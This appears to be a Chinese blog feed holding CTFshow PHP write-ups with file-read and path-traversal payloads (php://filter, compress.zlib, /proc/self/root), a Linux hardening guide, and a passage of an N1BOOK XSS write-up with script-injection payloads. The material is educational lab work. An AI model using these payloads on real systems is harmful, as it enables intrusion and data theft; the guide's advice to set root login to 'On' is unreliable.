src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211201191243482.png" alt="image-20211201191243482"></p><p>当文件存在当前目录，使用PHP伪协议时，返回<code>FALSE</code></p><p>绕过条件</p><p>payload:</p><blockquote><p>?file:php://filter/resource=flag.php</p><p>?file:php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</p><p>?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</p><p>?file=compress.zlib://flag.php</p></blockquote><p>关于过滤器php://的参考文档：<a href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></p><p>php://filter/实战技巧：<a href="https://www.anquanke.com/post/id/202510">https://www.anquanke.com/post/id/202510</a></p><h1 id="Web-113-目录溢出"><a href="#Web-113-目录溢出" class="headerlink" title="Web-113 目录溢出"></a>Web-113 目录溢出</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">function filter($file)&#123;    if(preg_match(&#39;&#x2F;filter|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;        die(&#39;hacker!&#39;);    &#125;else&#123;        return $file;    &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>预期解：</p><p><code>?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></p><blockquote><p>在Linux中/proc/self/root指向根目录，也就是说如果在命令行中输入ls /proc/self/root其实显示的是根目录下的内容，多次重复后可以绕过is_file</p></blockquote><p>非预期解：</p><p>利用没有被过滤的伪协议读文件：</p><p><code>?file=compress.zlib://flag.php</code></p><h1 id="Web-114-filter"><a href="#Web-114-filter" class="headerlink" title="Web-114 filter"></a>Web-114 filter</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">function filter($file)&#123;    if(preg_match(&#39;&#x2F;compress|root|zip|convert|\.\.\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123;        die(&#39;hacker!&#39;);    &#125;else&#123;        return $file;    &#125;&#125;$file&#x3D;$_GET[&#39;file&#39;];echo &quot;师傅们居然tql都是非预期 哼！&quot;;if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125; 师傅们居然tql都是非预期 哼！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>过滤中没有php和filter。</p><p>payload:<code>?file=php://filter/resource=flag.php</code></p><h1 id="Web-115-trim绕过"><a href="#Web-115-trim绕过" class="headerlink" title="Web-115 trim绕过"></a>Web-115 trim绕过</h1><div class="code-wrapper"><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&#39;flag.php&#39;);highlight_file(__FILE__);error_reporting(0);function filter($num)&#123;    $num&#x3D;str_replace(&quot;0x&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;0&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;.&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;e&quot;,&quot;1&quot;,$num);    $num&#x3D;str_replace(&quot;+&quot;,&quot;1&quot;,$num);    return $num;&#125;$num&#x3D;$_GET[&#39;num&#39;];if(is_numeric($num) and $num!&#x3D;&#x3D;&#39;36&#39; and trim($num)!&#x3D;&#x3D;&#39;36&#39; and filter($num)&#x3D;&#x3D;&#39;36&#39;)&#123;    if($num&#x3D;&#x3D;&#39;36&#39;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;hacker!!&quot;;    &#125;&#125;else&#123;    echo &quot;hacker!!!&quot;;&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h2><p>去除字符串首尾处的空白字符（或者其他字符）</p><p>语法：</p><p><code>trim(string,charlist)</code></p><p>描述：</p><p>string        必需。规定要检查的字符串</p><p>charlist      可选。规定从字符串中删除哪些字符。如果省略该函数，则移除下列所有字符。</p><blockquote><p>“\0”        - NULL</p><p>“\t”        - 制表符</p><p>“\n”        - 换行符</p><p>“\x0B”      - 垂直制表符</p><p>“\r”        - 回车</p><p>“ “         - 空格    </p></blockquote><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211202105809062.png" alt="image-20211202105809062"></p><p>输出<code>%09 %0A %0B %0C %0D + %2B - . 0 1 2 3 4 5 6 7 8 9</code></p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/image-20211202105318433.png" alt="image-20211202105318433"></p><p>输出<code> %0C %2B - . 0 1 2 3 4 5 6 7 8 9</code></p><p>因为<code>%2B</code> <code>-</code> <code>.</code> 被过滤</p><p>在数字前加空格也会被is_numeric识别为数字，trim过滤空格不会过滤<code>\f</code>(%0c)</p><p>payload:<code>?num=%0c36</code></p>]]></content>
    
    
    <summary type="html">CTFshow:PHP特性学习</summary>
    
    
    
    <category term="WebSec" scheme="https://whoiszkuan.github.io/categories/WebSec/"/>
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Web" scheme="https://whoiszkuan.github.io/tags/Web/"/>
    
    <category term="PHP" scheme="https://whoiszkuan.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Linux-Security</title>
    <link href="https://whoiszkuan.github.io/2021/11/04/Linux-Security/"/>
    <id>https://whoiszkuan.github.io/2021/11/04/Linux-Security/</id>
    <published>2021-11-04T12:58:18.000Z</published>
    <updated>2022-01-24T05:32:02.503Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux系统安全"><a href="#Linux系统安全" class="headerlink" title="Linux系统安全"></a>Linux系统安全</h1><h2 id="账户安全"><a href="#账户安全" class="headerlink" title="账户安全"></a>账户安全</h2><h3 id="用户类型"><a href="#用户类型" class="headerlink" title="用户类型"></a>用户类型</h3><ul><li>超级用户<ul><li>用户名为root或者UID为0的用户，可以修改所有系统文件</li></ul></li><li>系统用户<ul><li>Linux系统所需的內建用户，不能登录，如bin、adm、lp等</li></ul></li><li>普通用户<ul><li>一般使用的用户都为普通用户</li></ul></li></ul><hr><h3 id="用户信息存储"><a href="#用户信息存储" class="headerlink" title="用户信息存储"></a>用户信息存储</h3><ul><li>用户信息文件<ul><li>/etc/passwd</li><li>/etc/shadow</li></ul></li><li>组信息文件<ul><li>/etc/group</li><li>/etc/gshadow</li></ul></li></ul><p>正常登录流程：</p><p>用户登录–&gt;是否有该用户–&gt;确认用户的<code>UID</code>–&gt;核实<code>shadow</code>文件的密码–&gt;成功登录</p><h4 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h4><p><strong>系统识别用户的文件，所有的用户信息都在文件中记录</strong></p><p><code>zkuan:x:500:500:zkuan sun:/home/zkuan:/bin/bash</code></p><ol><li>用户名（也被成为登录名）</li><li>口令；在例子中我们看到的是x，其实密码已经被映射到<code>/etc/shadow</code>文件中</li><li>UID；用户ID</li><li>GID；用户组ID</li><li>用户名全称，可选</li><li>用户的家目录所在位置</li><li>用户所用shell的类型</li></ol><h4 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h4><p><code>zkuan:$y$j9T$NRRMLswRhLY1$/k2zkdTk.deUPg2sx7.11WXPPXK67:18840:0:99999:7:::</code></p><p><strong>passwd的影子文件，两文件互补</strong></p><ol><li>用户名</li><li>密码（被加密）</li><li>上次修改口令的时间</li><li>两次修改口令的间隔</li><li>两次修改口令间隔最少的天数</li><li>两次修改口令间隔最多的天数</li><li>在口令过期之后多少天禁用次用户</li><li>用户过期日期</li><li>保留字段，目前为空</li></ol><h4 id="etc-group"><a href="#etc-group" class="headerlink" title="/etc/group"></a>/etc/group</h4><p><strong>具有共同特性的用户集合起来就是用户组</strong></p><p><code>root:x:0:root,linux</code></p><ol><li>用户组名称</li><li>用户组密码</li><li>GID</li><li>用户列表，每个用户之间用<code>,</code>号分割</li></ol><h4 id="etc-gshadow"><a href="#etc-gshadow" class="headerlink" title="/etc/gshadow"></a>/etc/gshadow</h4><p><strong>/etc/group的加密文件</strong></p><p><code>groupname:x:admin:admin</code></p><ol><li>用户组</li><li>用户组密码</li><li>用户组管理者</li><li>用户组成员</li></ol><hr><h3 id="用户认证方式"><a href="#用户认证方式" class="headerlink" title="用户认证方式"></a>用户认证方式</h3><h4 id="用户名-密码（SSH、Telnet、FTP）"><a href="#用户名-密码（SSH、Telnet、FTP）" class="headerlink" title="用户名+密码（SSH、Telnet、FTP）"></a>用户名+密码（SSH、Telnet、FTP）</h4><ul><li>包含数字、字母、下划线</li><li>容易暴力破解、密码丢失</li></ul><h4 id="基于证书（秘钥）"><a href="#基于证书（秘钥）" class="headerlink" title="基于证书（秘钥）"></a>基于证书（秘钥）</h4><ul><li>公钥保存在远程服务器，专用秘钥保存在本地</li><li>通过本地秘钥与服务器公钥进行配对认证登录</li><li>避免暴力破解</li></ul><h4 id="PAM（Pluggable-Authentication-Modules）"><a href="#PAM（Pluggable-Authentication-Modules）" class="headerlink" title="PAM（Pluggable Authentication Modules）"></a>PAM（Pluggable Authentication Modules）</h4><ul><li>适用于本地登录与远程登录的机制</li><li>很大灵活性，通过配置文件可设置多重认证方式，不同登录方式及不同策略</li><li>安全性较强</li></ul><hr><h3 id="用户访问文件权限分配"><a href="#用户访问文件权限分配" class="headerlink" title="用户访问文件权限分配"></a>用户访问文件权限分配</h3><p><code>drwxr-xr-x  3 zkuan zkuan      4096  8月  1 23:11  .vscode</code></p><ol><li>d:文件类型：<code>d</code>为文件夹，<code>-</code>为文件</li><li>rwx:文件拥有者的权限（User）</li><li>r-x:文件拥有者所在组其他用户的权限（Group）</li><li>r-x:系统中其他用户权限（Other）</li><li>2:链接数</li><li>zkuan:文件拥有者UID</li><li>zkuan:文件拥有者GID</li><li>4096:文件大小</li><li>8月  1 23:11:最后修改时间</li><li>.vscode:文件名</li></ol><hr><h3 id="权限表示方式"><a href="#权限表示方式" class="headerlink" title="权限表示方式"></a>权限表示方式</h3><p><strong>r–&gt;读(4)、w–&gt;写(2)、x–&gt;执行(1)</strong></p><p>chmod命令给文件设置权限：</p><blockquote><p>chmod 777 config</p><p>chmod u=rwx config</p></blockquote><table><thead><tr><th>-rw——-(600)</th><th>只有拥有者有读、写权限</th></tr></thead><tbody><tr><td><strong>-rw-r–r–</strong>(644)</td><td><strong>只有拥有者有读、写权限；而组用户和其他用户只有读权限</strong></td></tr><tr><td>-rwx——(700)</td><td><strong>只有拥有者有读、写、执行权限</strong></td></tr><tr><td>-rwxr-xr-x(755)</td><td><strong>拥有者读、写、执行；组用户和其他用户只有读、执行权限</strong></td></tr><tr><td>-rwx–x–x(711)</td><td><strong>拥有者读、写、执行；组用户和其他用户只有执行权限</strong></td></tr><tr><td>-rw-rw-rw-(666)</td><td><strong>所有用户都有读、写权限</strong></td></tr><tr><td>-rwxrwxrwx(777)</td><td><strong>所有用户都有读、写、执行权限</strong></td></tr></tbody></table><hr><h3 id="特殊权限"><a href="#特殊权限" class="headerlink" title="特殊权限"></a>特殊权限</h3><h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><p>全称Set User ID,当小写字母<code>s</code>出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得文件拥有者的权限</p><p><code>-rwsr-xr-x 1 root root 63960  2月  7  2020 /usr/bin/passwd</code></p><p>文件拥有者的执行位上出现为<code>s</code>为不是<code>x</code>，所以说passwd这个程序具有SUID权限，因此在修改用户密码时用的就是<code>sudo passwd xxx</code>命令。</p><ul><li>如果在浏览文件时，发现文件所有者权限的第三位为大写<code>S</code>则表明该文件SUID无效</li></ul><p>SUID权限机制：</p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/SUID.png"></p><p><strong>使用SUID</strong>需要满足：</p><ol><li>SUID只对二进制文件有效，不能作用于目录或者脚本</li><li>调用者对该文件有执行权</li><li>在执行过程中调用者会暂时获得该文件的所有者权限</li><li>权限只在程序执行的过程中有效</li></ol><h4 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h4><p>全称Set Group ID,当小写字母<code>s</code>出现在文件用户组权限位上时，对普通二进制文件和目录都有效。作用于普通文件时，和SUID类似，用户将获得该文件所属组的权限；作用于目录时，当用户对某一目录有写和执行的权，可在该目录下建立文件，而该用户在这个目录建立的文件都属于这个目录的所属组</p><h4 id="SBIT"><a href="#SBIT" class="headerlink" title="SBIT"></a>SBIT</h4><p>全称Sticky Bit(粘滞位),小写字母<code>t</code>出现在其他用户权限的执行位上。当目录拥有SBIT权限时，该用户在这个目录下所建立的文件只有该用户和root用户可以删除。</p><p><code>drwxrwxrwt 26 root root 12288 11月  4 20:41 /tmp</code></p><ul><li>如果目录的其他用户权限执行位是大写<code>T</code>，则SBIT权限无效。</li></ul><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/tesqx.png"></p><hr><h3 id="三种特殊权限的设置"><a href="#三种特殊权限的设置" class="headerlink" title="三种特殊权限的设置"></a>三种特殊权限的设置</h3><p><strong>三个权限的对应数字为：SUID(4),SGID(2),SBIT(1)</strong></p><p>假设要设置文件夹权限为<code>-rwsr-xr-x</code>,由于s在所有者权限的执行位上，s为SUID，因此原先的755要在前面加上4，用<code>chmod 4755 config</code>赋予</p><p><strong>符号法设置特殊权限</strong></p><p>权限中的ugoa代表的是：</p><ul><li>u=user</li><li>g=group</li><li>o=other</li><li>a=all</li></ul><p>给所有人添加执行权限：<code>chmod a+x config</code></p><p>给所有者全部权限，所属组读写，其他人读权限：<code>chmod u=rwx,g=rw,o=r config</code></p><p>清除各种身份权限：<code>chmod a=- config</code></p><h2 id="账户风险和安全策略"><a href="#账户风险和安全策略" class="headerlink" title="账户风险和安全策略"></a>账户风险和安全策略</h2><h3 id="特权用户排查"><a href="#特权用户排查" class="headerlink" title="特权用户排查"></a>特权用户排查</h3><p><code>awk -F: &#39;$3==0 &#123;print $1&#125;&#39; /etc/passwd</code></p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/2021-11-0509-37-48%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/2021-11-0509-41-39%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p><ul><li>$3=0:取<code>/etc/passwd</code>中第三位值为0的用户</li><li>print $1:如果第三位值为0，便打印出第一位（用户名称）</li></ul><p>排查UID为0的用户，一般只有root用户UID为0</p><h3 id="账号密码生命周期"><a href="#账号密码生命周期" class="headerlink" title="账号密码生命周期"></a>账号密码生命周期</h3><p>对于采用静态口令认证的服务器，账户密码生命周期应小于90，且拒绝弱口令以及空口令</p><p>使用<code>more /etc/login.defs</code>检查相关参数</p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/2021-11-0509-47-43%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p><ul><li><strong>PASS_MIN_LEN</strong>:设置密码最短长度</li></ul><h3 id="密码强度"><a href="#密码强度" class="headerlink" title="密码强度"></a>密码强度</h3><p>如果只使用<strong>PASS_MIN_LEN</strong>设置密码长度并不严谨，因为纯字母或纯数字也可以登录，为了保障用户密码强度，静态口令认证长度至少8位，并包括数字、小写字母、大写字母、特殊符号4类中至少2类</p><h4 id="etc-pam-d-system-auth"><a href="#etc-pam-d-system-auth" class="headerlink" title="/etc/pam.d/system-auth"></a><strong>/etc/pam.d/system-auth</strong></h4><p><code>password requisite pam_cracklib.so difok=3 minlen=8 ucredit=-1 lcredit=-1 dcredit=-1</code></p><p>新密码与旧密码不同的个数为3，至少8位，包含一位大写字母、一位小写字母、一位数字。</p><h3 id="用户锁定"><a href="#用户锁定" class="headerlink" title="用户锁定"></a>用户锁定</h3><p>配置用户连续认证失败次数超过10次，锁定用户账号。</p><h4 id="etc-pam-d-system-auth-1"><a href="#etc-pam-d-system-auth-1" class="headerlink" title="/etc/pam.d/system-auth"></a>/etc/pam.d/system-auth</h4><p><code>auth required pam_tally.so onerr=fail deny=10 unlock_time=300</code></p><p>密码连续错误10次，账号锁定300秒（5分钟）</p><ul><li>解锁用户<code>faillog -u (username) -r</code></li></ul><h3 id="访问权限控制"><a href="#访问权限控制" class="headerlink" title="访问权限控制"></a>访问权限控制</h3><h4 id="umask安全配置"><a href="#umask安全配置" class="headerlink" title="umask安全配置"></a>umask安全配置</h4><p>/etc/login.defs</p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/2021-11-0510-38-55%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p><p><strong>umask的作用：</strong>默认情况下umask值为022（可用umask命令查看）</p><p>此时建立的文件默认权限是644(6-0,6-2,6-2)，建立文件夹默认权限是755(7-0,7-2,7-2)</p><p>022表示默认创建文件夹权限为755</p><p>027表示默认创建文件夹权限为750</p><h4 id="重要目录权限"><a href="#重要目录权限" class="headerlink" title="重要目录权限"></a>重要目录权限</h4><p>对于重要目录，建议执行以下操作</p><p><code>chmod -R 750 /etc/rc.d/init.d/*</code></p><p>只有root可以读写执行这个目录下的脚本</p><h3 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h3><h4 id="查看未授权的SUID-SGID"><a href="#查看未授权的SUID-SGID" class="headerlink" title="查看未授权的SUID/SGID"></a>查看未授权的SUID/SGID</h4><ul><li>SUID/SGID程序在运行时，将有效用户ID改变为该程序所有者(组)ID。因而可能存在一定的安全隐患，经常性的对比SUID/SGID文件列表，以便能够及时发现可以后门程序</li><li>找出文件中所有含s位的程序，把不必要的s位去掉，或者把根本不用的直接删除，这样可以防止用户滥用及提升权限的可能性<ul><li>查找SUID可执行程序<ul><li>find / -type f -perm -4000 -ls</li></ul></li><li>查找SGID可执行程序<ul><li>find / -type f -perm -2000 -ls</li></ul></li><li>查找SUID/SGID/或者两个都有<ul><li>find / -type f -perm -6000 -ls</li></ul></li></ul></li></ul><blockquote><p>find:查找命令</p><p>/:指定路径，根目录</p><p>-type:指定类型</p><p>f:文件类型</p><p>-perm:指定权限</p><p>-4000:权限</p><p>-ls:列出目录</p></blockquote><ul><li>-4000:至少满足4000权限</li></ul><h4 id="syslog登录事件记录"><a href="#syslog登录事件记录" class="headerlink" title="syslog登录事件记录"></a>syslog登录事件记录</h4><p><strong>/etc/rsyslog.conf</strong></p><h4 id="history时间戳"><a href="#history时间戳" class="headerlink" title="history时间戳"></a>history时间戳</h4><p>当遭受黑客入侵后，需要查看history命令记录，查看是否有删除或移动文件、修改配置等操作，配置history时间戳，便于分析、定位问题</p><p><strong>/etc/profile</strong></p><p><code>export HISTTIMEFORMAT= &quot;%F %T &#39;whoami&#39;&quot;</code></p><h3 id="资源控制"><a href="#资源控制" class="headerlink" title="资源控制"></a>资源控制</h3><h4 id="登录超时"><a href="#登录超时" class="headerlink" title="登录超时"></a>登录超时</h4><p><strong>/etc/profile</strong></p><p>添加”TMOUT=”行开头的注释</p><h4 id="限制登录"><a href="#限制登录" class="headerlink" title="限制登录"></a>限制登录</h4><ul><li>禁止root远程登录<ul><li>/etc/ssh/sshd_config</li><li>确保PERMITROOTLOGIN为<code>On</code></li></ul></li><li>限定信任主机<ul><li>/etc/hosts.equiv</li><li>/$HOME/.RHOSTS</li><li>查看上述两个文件中的主机，删除其中不必要的主机，防止存在多余的信任主机</li><li>或直接关闭所有R系列远程服务<ul><li>RLOGIN</li><li>RSH</li><li>REXEC</li></ul></li></ul></li><li>禁用Telnet，使用SSH进行管理<ul><li>开启SSH服务：<code>systemctl start sshd</code></li></ul></li><li>限制能够登录本机的IP地址<ul><li>/etc/ssh/sshd_config<ul><li>ALLOWUSERS <a href="mailto:&#122;&#107;&#x75;&#x61;&#110;&#x40;&#49;&#x30;&#46;&#x30;&#x2e;&#48;&#46;&#x31;&#x32;&#51;">&#122;&#107;&#x75;&#x61;&#110;&#x40;&#49;&#x30;&#46;&#x30;&#x2e;&#48;&#46;&#x31;&#x32;&#51;</a><ul><li>允许zkuan通过地址10.0.0.123登录本机</li></ul></li><li>ALLOWUSERS *@10.0.*.*<ul><li>仅允许10.0.0.0/16网段的所有用户登录</li></ul></li></ul></li></ul></li></ul><h4 id="修改SSH配置"><a href="#修改SSH配置" class="headerlink" title="修改SSH配置"></a>修改SSH配置</h4><ul><li>修改端口Port:/etc/ssh/sshd_config</li><li>修改banner信息<ul><li>修改sshd_config<ul><li>/etc/ssh/sshd_config</li><li>如存在，则将banner字段设置为NONE</li></ul></li><li>修改motd<ul><li>/etc/motd</li><li>查看该文件内容，更新成自己想要添加的内容</li></ul></li></ul></li></ul><h3 id="入侵防范"><a href="#入侵防范" class="headerlink" title="入侵防范"></a>入侵防范</h3><ul><li>使用防火墙<ul><li>包过滤</li><li>NAT</li><li>数据包处理</li></ul></li><li>语法<ul><li>iptables [-t table] command [match][target]</li></ul></li><li>应用<ul><li>iptables -I input -s 192.168.1.0/24 -p tcp –dport 22 -j ACCEPT</li><li>只允许本机22端口被192.168.1.0/24访问</li></ul></li></ul><blockquote><p>-I:插入规则</p><p>input:插入栈数据(访问流量)</p><p>-s:源地址(访问主机IP)</p><p>-p:指定协议</p><p>tcp:TCP协议</p><p>–dport:目标端口</p><p>22:22端口</p><p>-j:目标跳转</p><p>ACCEPT:允许访问</p></blockquote><hr><h2 id="文件系统安全"><a href="#文件系统安全" class="headerlink" title="文件系统安全"></a>文件系统安全</h2><p>一切资源都为文件(包括硬件设备)</p><p><img src="https://gitee.com/zku4n/picgo/raw/master/img/linux_sys.png"></p><h3 id="文件和目录安全"><a href="#文件和目录安全" class="headerlink" title="文件和目录安全"></a>文件和目录安全</h3><p><strong>确保重要目录的权限设置，限制用户访问</strong></p><ul><li>排查任何人都有写权限的目录<ul><li>find / -xdev -type f \( -perm -0002 -a ! -perm -1000 \) -print</li><li>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print</li></ul></li></ul><blockquote><p>/:根目录</p><p>-xdev:只检查和指定目录在同一系统下的文件，避免出现其他系统的文件</p><p>-type:指定类型,f是文件，d是目录</p><p>-perm:按照文件权限查找文件</p><p>-0002:大于0002都列出来</p><p>-a:and的意思，条件并列</p><p>!:逻辑非</p><p>( -perm -0002 -a ! -perm -1000 \):权限大于0002，且排除1000权限</p><p>-print:打印符合条件的文件</p></blockquote><ul><li>配置默认的umask值为027</li><li>检查未授权SUID/SGID</li></ul><h3 id="文件目录权限"><a href="#文件目录权限" class="headerlink" title="文件目录权限"></a>文件目录权限</h3><ul><li>目录权限设置<ul><li>chmod [-cfvR] filename</li></ul></li><li>所有者和所有组设置<ul><li>chown [-cfhvR] user[:group] filename</li><li>demo:chown zkuan:zkuangroup /home/zkuan/config</li></ul></li></ul><hr><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h3 id="系统日志的分类"><a href="#系统日志的分类" class="headerlink" title="系统日志的分类"></a>系统日志的分类</h3><h4 id="Linux日志"><a href="#Linux日志" class="headerlink" title="Linux日志"></a>Linux日志</h4><p>日志的主要用途：</p><ol><li>系统审计：记录登录系统的用户和日常行动</li><li>监测追踪：系统遭受到攻击时如何追踪溯源到攻击者</li><li>分析统计：系统的性能、错误等统计</li></ol><h4 id="var-log-messages"><a href="#var-log-messages" class="headerlink" title="/var/log/messages"></a>/var/log/messages</h4><p>Linux最核心的日志文件，假如某个服务没有定义日志文件，那么该服务产生的日志文件就会记录到这个文件中，每周归档一次，默认只保留5次。归档的方法都是由”/etc/logrotate.conf”来控制</p><h4 id="var-log-wtmp"><a href="#var-log-wtmp" class="headerlink" title="/var/log/wtmp"></a>/var/log/wtmp</h4><p>查看用户的登录、注销信息，同时记录系统的启动、重启、关机等事件。不能cat直接查看，必须用<code>last</code>查看</p><h4 id="var-log-btmp"><a href="#var-log-btmp" class="headerlink" title="/var/log/btmp"></a>/var/log/btmp</h4><p>和wtmp类似，不能用cat直接查看，用lastb查看，记录用户登录无效的历史</p><h4 id="var-log-maillog"><a href="#var-log-maillog" class="headerlink" title="/var/log/maillog"></a>/var/log/maillog</h4><p>记录邮件相关的日志</p><h4 id="var-log-cron"><a href="#var-log-cron" class="headerlink" title="/var/log/cron"></a>/var/log/cron</h4><p><strong>记录系统定时任务相关的日志</strong></p><h4 id="var-log-cpus"><a href="#var-log-cpus" class="headerlink" title="/var/log/cpus"></a>/var/log/cpus</h4><p>记录cpu信息</p><h4 id="var-log-lastlog"><a href="#var-log-lastlog" class="headerlink" title="/var/log/lastlog"></a>/var/log/lastlog</h4><p>记录所有用户最后一次登录的时间，只能通过<code>lastlog</code>命令查看</p><h4 id="var-log-sudo-log"><a href="#var-log-sudo-log" class="headerlink" title="/var/log/sudo.log"></a>/var/log/sudo.log</h4><p>记录使用<code>sudo</code>发出的命令，需要先配置<code>/etc/sudoers</code>中<code>logfile=/var/log/sudo.log</code></p><h3 id="日志文件分析工具"><a href="#日志文件分析工具" class="headerlink" title="日志文件分析工具"></a>日志文件分析工具</h3><h4 id="logrotate"><a href="#logrotate" class="headerlink" title="logrotate"></a>logrotate</h4><p>支持日志的切割、压缩、清理以及邮件报警，通过<code>crontab</code>服务定时运行，也可用来管理自己的服务日志</p><p><strong>使用方法：</strong></p><ul><li>默认配置文件路径：/etc/logrotate.conf</li><li>单次执行测试：`logrotate -f /etc/logrotate.conf</li><li>定时执行：<code>/etc/crontab */5**\*\* root /sbin/logrotate /etc/logrotate.conf</code> 五分钟执行一次 </li></ul>]]></content>
    
    
    <summary type="html">Linux security Prerequisites</summary>
    
    
    
    <category term="SystemSec" scheme="https://whoiszkuan.github.io/categories/SystemSec/"/>
    
    
    <category term="Security" scheme="https://whoiszkuan.github.io/tags/Security/"/>
    
    <category term="Linux" scheme="https://whoiszkuan.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>N1BOOK-XSS</title>
    <link href="https://whoiszkuan.github.io/2021/11/04/N1BOOK-XSS/"/>
    <id>https://whoiszkuan.github.io/2021/11/04/N1BOOK-XSS/</id>
    <published>2021-11-04T08:58:37.000Z</published>
    <updated>2022-01-24T05:30:51.027Z</updated>
    
    <content type="html"><![CDATA[<h1 id="N1BOOK-XSS"><a href="#N1BOOK-XSS" class="headerlink" title="N1BOOK-XSS"></a>N1BOOK-XSS</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>直接构造payload看网页反应</p><p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>传入参数：<code>username=&lt;script&gt;alert()&lt;/script&gt;</code></p><p>审计源代码</p><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>    <span class="token keyword">if</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    location<span class="token punctuation">.</span>search <span class="token operator">=</span> <span class="token string">"?username=xss"</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">var</span> username <span class="token operator">=</span> <span class="token string">'&lt;script>alert(/xss/)&lt;/script>'</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'ccc'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML<span class="token operator">=</span> <span class="token string">"Welcome "</span> <span class="token operator">+</span> <span class="token function">escape</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>escape()函数对字符串进行了编码</p></blockquote><p>发现<code>&lt;script&gt;alert()&lt;/script&gt;</code>被username用单引号包裹，尝试闭合，并将后面的单引号注释掉。</p><p>写入payload：<code>username=&#39;;alert();//</code></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>传入参数：<code>username=&lt;script&gt;alert()&lt;/script&gt;</code></p><p>审计源代码：</p><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>    <span class="token keyword">if</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    location<span class="token punctuation">.</span>search <span class="token operator">=</span> <span class="token string">"?username=xss"</span>    <span class="token punctuation">&#125;</span>    <span 